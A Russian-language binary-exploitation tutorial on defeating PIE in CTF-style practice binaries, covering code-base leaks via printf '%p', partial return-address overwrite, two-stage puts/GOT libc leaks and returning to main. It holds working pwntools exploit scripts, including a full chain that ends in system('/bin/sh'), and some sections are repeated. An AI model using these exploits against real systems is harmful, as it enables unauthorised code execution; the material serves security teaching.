## Вопрос, с которого всё начинается

Ты натренировался писать ret2win: адрес `win` известен, кладёшь его на стек — готово. Но вот новый бинарь, и тот же эксплойт не работает: `win` по адресу `0x4011a9` просто нет.

Причина — **PIE**. При сборке с `-pie -fPIC` весь образ грузится по случайному адресу, и адреса функций меняются каждый запуск. Как вернуться в `win`, если ты не знаешь, где он?

## Наш пример: PIE-бинарь

```bash
$ readelf -h ./chall | grep Type
  Type:  DYN (Position-Independent Executable file)
$ checksec --file=./chall
    PIE:      PIE enabled
    NX:       NX enabled
```

При PIE адрес функции в Ghidra — это **смещение** от базы. Абсолютный адрес = `base + offset`. ASLR рандомизирует только базу, а младшие 12 бит (смещение внутри страницы) фиксированы. На этом факте строятся все обходы.

## Шаг 1. Стратегия 1: утечка базы кода

Если программа печатает адрес, вычти из него известное смещение — получишь базу:

```python
from pwn import *
context.binary = elf = ELF('./chall')
p = process('./chall')
p.sendline(b'%7$p')                 # утечка адреса из стека
leak = int(p.recvline().strip(), 16)
elf.address = leak - 0x1234          # 0x1234 — offset из Ghidra
log.success(f'PIE base = {hex(elf.address)}')
p.sendline(flat({72: elf.symbols['win']}))
p.interactive()
```

После `elf.address = base` все `elf.symbols[...]`, `elf.got[...]`, `elf.plt[...]` становятся **абсолютными** — дальше эксплойт пишется как для non-PIE.

## Шаг 2. Разные функции — разная утечка

- `printf("%p")` печатает адреса из стека — самый дешёвый способ, но позиции надо подбирать.
- `puts(addr)` печатает строку по адресу — неудобно для кода (оборвётся на нуле).
- `write(1, addr, 8)` печатает ровно 8 байт — идеально для указателя.

Если программа печатает адрес своей функции (например, «menu at 0x...»), это прямой подарок: вычитаешь смещение и получаешь базу. Всегда проверяй, **какой именно** адрес печатается: `%p` может вернуть libc или стек, а не код.

| Диапазон адреса | Регион |
|---|---|
| `0x55...` / `0x56...` | PIE-образ / heap |
| `0x7f...` | libc, ld.so, стек |
| `0x7ff...` | стек |

## Утечка через printf, puts и write: практика

Разные функции дают утечку по-разному, и это влияет на выбор приёма. `printf("%p")` печатает адреса из стека — самый дешёвый способ, но позиции надо подбирать перебором. `puts(addr)` печатает строку по адресу: если передать адрес функции, он выведет байты кода до первого `\x00` — неудобно и может обрезаться. `write(1, addr, 8)` печатает ровно 8 байт — идеально для утечки указателя. В задачах с PIE чаще всего ищут либо `%p`-утечку, либо `write`-примитив.

Если программа печатает адрес своей функции (например, «menu at 0x...»), это прямой подарок: вычитаешь смещение из дизассемблера и получаешь базу. Всегда проверяй, **какой именно** адрес печатается — `%p` может вернуть libc или стек, а не код, и тогда вычитание смещения даст мусор.

## Шаг 3. Стратегия 2: partial overwrite

Если утечки нет, работает **частичная перезапись**. ASLR двигает только старшие биты, младшие 12 фиксированы. Значит, можно переписать один-два младших байта сохранённого адреса возврата и попасть в другую функцию в той же странице:

```python
p.sendline(b'A'*72 + b'\x26')      # младший байт -> win в той же странице
```

Условие: целевая функция должна быть в пределах 256 байт (для одного байта) от исходной точки возврата и не содержать нулевых байт в младшем байте. Часто берут два байта (`\x26\x12`) — тогда сохраняются старшие 6.

## Шаг 4. Стратегия 3: two-stage leak

Если бинарь PIE, а libc — нет, сначала утекают базу кода, потом вызывают `puts@plt(puts@got)` уже по абсолютным адресам, затем утекают libc:

```python
rop = ROP(elf)                     # elf.address уже установлен
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])
```

Это классический двухступенчатый подход. Ключевое: **без `elf.address` цепочка уйдёт в мусор** — `elf.plt['puts']` вернёт смещение, а не адрес.

## Шаг 5. Полный эксплойт PIE + ASLR + NX

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')       # PIE
libc = ELF('./libc.so.6', checksec=False)
OFFSET = 72

p = process('./chall')
# 1) утечка базы кода
p.recvuntil(b'name: ')
p.sendline(b'%p')
leak = int(p.recvline().strip(), 16)
elf.address = leak - 0x1337
log.success(f'PIE base = {hex(elf.address)}')
# 2) утечка libc по абсолютным адресам
rop = ROP(elf)
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])
p.sendlineafter(b'> ', flat({OFFSET: rop.chain()}))
libc.address = u64(p.recvline().strip().ljust(8, b'\x00')) - libc.symbols['puts']
# 3) финал
rop2 = ROP(libc)
rop2.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
p.sendlineafter(b'> ', flat({OFFSET: rop2.chain()}))
p.interactive()
```

## Шаг 6. Bounce: возврат в main

**Bounce** — техника повторного входа: вместо прямого финала возвращаемся в `main` (или начало уязвимой функции), чтобы получить второй раунд ввода. Это нужно, когда программа читает данные лишь один раз, а нам мало: сначала утечка, потом финальный ROP. Мы уже использовали это в ret2libc — `rop.call(elf.symbols['main'])`.

## Шаг 7. Отладка PIE

Под GDB адрес загрузки виден через `info proc mappings` или `vmmap`. Ставь брейкпоинт по смещению: `b *($base + 0x1234)`. При повторных запусках база меняется — используй `gdb.debug`, где pwntools сам считает базу:

```text
(gdb) starti
(gdb) info proc mappings | grep chall
```

## Расширенные краевые случаи

- **Утечка адреса heap вместо кода.** `%p` может вернуть heap-указатель; его page offset не совпадёт с кодом — перебери позиции.
- **Несколько утечек сразу.** `%p.%p.%p` за один ввод даёт адреса стека, libc и кода; идентифицируй их по диапазонам.
- **PIE + canary.** Сначала утечка canary, затем базы — обе через format string.
- **`__libc_start_main+243`.** Классическая утечка libc через `%p` на позиции, где лежит адрес возврата в libc.
- **BRK-раскладка.** Иногда база PIE выровнена на `0x1000`, иногда нет — проверяй `& ~0xfff` только при уверенности.

## На что смотреть дальше

- **`ld.so` тоже PIE.** Утечка через `_dl_runtime_resolve` даёт базу линкера, не libc.
- **Partial overwrite с неверным вторым байтом** попадёт в середину инструкции — краш.
- **Нулевые байты в адресе** обрывают строковую запись — используй `read`.
- **`elf.address` не сброшен** — `elf.symbols[...]` вернёт смещение, эксплойт уйдёт не туда.
- **Утечка обрезана `\n`/`\x00`** — дополняй `ljust(8, b'\x00')`.
- **Утечка адреса heap вместо кода** — page offset не совпадёт; перебери позиции.

## Инструмент: nm — таблица символов

`nm` перечисляет символы бинарника: имена функций и глобальных переменных с их адресами. Если символы не срезаны, это самый быстрый способ найти нужную функцию.

Ключи, которые пригодятся:
* `nm <файл>` — все символы с адресами;
* `nm -C <файл>` — демутируй C++-имена (читаемые сигнатуры);
* `T`/`t` — код (глобальный/локальный), `R`/`r` — только чтение (`.rodata`), `D`/`B` — данные;
* нижний регистр = локальный символ, верхний = глобальный/экспортируемый.

## Что мы теперь знаем

- PIE рандомизирует базу образа; младшие 12 бит фиксированы.
- Утечка адреса кода минус известное смещение = база.
- После `elf.address = base` эксплойт пишется как для non-PIE.
- Partial overwrite не требует базы — переписывает младшие байты.
- Bounce (возврат в `main`) даёт второй раунд ввода.
